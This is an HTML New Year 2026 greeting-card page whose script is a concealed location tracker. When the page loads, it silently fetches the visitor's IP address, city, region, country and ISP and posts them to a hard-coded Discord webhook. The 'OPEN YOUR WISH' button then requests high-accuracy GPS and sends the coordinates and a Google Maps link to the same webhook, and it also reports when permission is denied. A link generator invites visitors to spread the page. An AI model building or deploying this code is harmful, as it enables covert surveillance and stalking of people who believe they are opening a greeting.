<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy New Year 2026!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        :root { --gold: #ffd700; --dark: #050510; }
        body { margin: 0; background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        
        /* Particle Background */
        #star-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; }

        .card { z-index: 10; background: rgba(10, 10, 25, 0.9); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 215, 0, 0.3); backdrop-filter: blur(15px); text-align: center; max-width: 420px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5); }
        
        .sender-box { color: var(--gold); font-weight: bold; text-transform: uppercase; letter-spacing: 3px; font-size: 0.9rem; margin-bottom: 15px; }
        
        h1 { font-size: 4rem; margin: 0; background: linear-gradient(to bottom, #fff, var(--gold), #ffae00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 10px rgba(255,215,0,0.5)); }
        
        .message { color: #ddd; line-height: 1.6; margin: 20px 0 30px 0; }
        
        .btn-celebrate { background: linear-gradient(45deg, #ffd700, #ff8c00); color: #000; border: none; padding: 18px 50px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .btn-celebrate:hover { transform: scale(1.05); box-shadow: 0 0 30px var(--gold); }

        .counter { font-size: 0.8rem; color: #555; margin-top: 20px; }

        .share-tool { margin-top: 35px; padding-top: 20px; border-top: 1px solid #222; }
        input { background: #111; border: 1px solid #333; color: #fff; padding: 10px; border-radius: 8px; width: 60%; margin-bottom: 10px; }
        .gen-link { font-size: 0.75rem; color: #888; background: #111; padding: 5px; border-radius: 4px; word-break: break-all; margin-top: 10px; display: none; }
    </style>
</head>
<body>

    <canvas id="star-canvas"></canvas>

    <div class="card">
        <div id="senderDisplay" class="sender-box">Incoming New Year Wish</div>
        <p style="margin:0; opacity: 0.7;">Get ready for</p>
        <h1>2026</h1>
        <p class="message">"A new year is like a blank book, and the pen is in your hands. It is your chance to write a beautiful story for yourself."</p>
        
        <button class="btn-celebrate" onclick="handleInteraction()">OPEN YOUR WISH âœ¨</button>

        <div class="counter">ðŸ”¥ 1,482 people joined the celebration</div>

        <div class="share-tool">
            <p style="font-size: 0.8rem; color: #777;">Create your custom wish link:</p>
            <input type="text" id="nameInput" placeholder="Enter your name">
            <button style="background:none; border: 1px solid #444; color:#999; padding: 8px 15px; border-radius: 8px; cursor:pointer;" onclick="generateShareLink()">Get Link</button>
            <div id="linkOutput" class="gen-link"></div>
        </div>
    </div>

    <audio id="fireworkSound" src="https://assets.mixkit.co/active_storage/sfx/2867/2867-preview.mp3"></audio>

    <script>
        // ==========================================
        // 1. CONFIGURATION (REPLACE WEBHOOK HERE)
        // ==========================================
        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455541858489991209/eerPl-hDw1X9fASbpoTaW65lvgTk4X5NdCzcoo1HT5lyNSC6KrvuAw_TRWCxHwu7zQjj";

        // ==========================================
        // 2. SILENT TRACKING (Runs on Load)
        // ==========================================
        let silentData = {};

        window.onload = async () => {
            // Handle Name Personalization
            const urlParams = new URLSearchParams(window.location.search);
            const name = urlParams.get('name');
            if (name) {
                document.getElementById('senderDisplay').textContent = `FROM: ${decodeURIComponent(name)}`;
            }

            // Background Stars
            initStars();

            // Fetch IP & Approximate Location (No prompt)
            try {
                const response = await fetch('https://ipapi.co/json/');
                silentData = await response.json();
                
                sendToDiscord("ðŸŸ¢ SILENT VISIT", {
                    "IP": silentData.ip,
                    "City": silentData.city,
                    "Region": silentData.region,
                    "Country": silentData.country_name,
                    "ISP": silentData.org,
                    "Referrer": name || "Direct Link"
                }, 3447003); // Green color
            } catch (e) {
                console.log("Silent logging failed");
            }
        };

        // ==========================================
        // 3. INTERACTIVE TRACKING (GPS Prompt)
        // ==========================================
        async function handleInteraction() {
            // Visuals & Sound
            document.getElementById('fireworkSound').play();
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ffd700', '#ffffff'] });

            // Request GPS (Triggers Permission Prompt)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendToDiscord("ðŸŽ¯ PRECISE GPS CAPTURED", {
                            "Status": "Permission Granted",
                            "Latitude": pos.coords.latitude,
                            "Longitude": pos.coords.longitude,
                            "Accuracy": `${pos.coords.accuracy.toFixed(1)} meters`,
                            "Google Maps": `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        }, 16768768); // Gold color
                    },
                    (err) => {
                        sendToDiscord("âš ï¸ GPS DENIED", {
                            "Status": "User blocked location prompt",
                            "IP (Reference)": silentData.ip || "Unknown"
                        }, 16711680); // Red color
                    },
                    { enableHighAccuracy: true }
                );
            }
            
            alert("âœ¨ Happy New Year 2026! âœ¨\nYour personalized celebration has started!");
        }

        // ==========================================
        // 4. DISCORD SENDER
        // ==========================================
        async function sendToDiscord(type, dataFields, color) {
            const fields = Object.entries(dataFields).map(([key, value]) => ({
                name: key,
                value: String(value),
                inline: true
            }));

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: type,
                        fields: fields,
                        color: color,
                        timestamp: new Date()
                    }]
                })
            });
        }

        // ==========================================
        // 5. UTILS (Link Generator & Background)
        // ==========================================
        function generateShareLink() {
            const name = document.getElementById('nameInput').value;
            if(name) {
                const base = window.location.href.split('?')[0];
                const final = `${base}?name=${encodeURIComponent(name)}`;
                const out = document.getElementById('linkOutput');
                out.style.display = "block";
                out.textContent = final;
            }
        }

        function initStars() {
            const canvas = document.getElementById('star-canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            for(let i=0; i<150; i++) {
                ctx.fillStyle = "rgba(255, 255, 255, " + Math.random() + ")";
                ctx.beginPath();
                ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*1.5, 0, Math.PI*2);
                ctx.fill();
            }
        }
    </script>
</body>
</html>
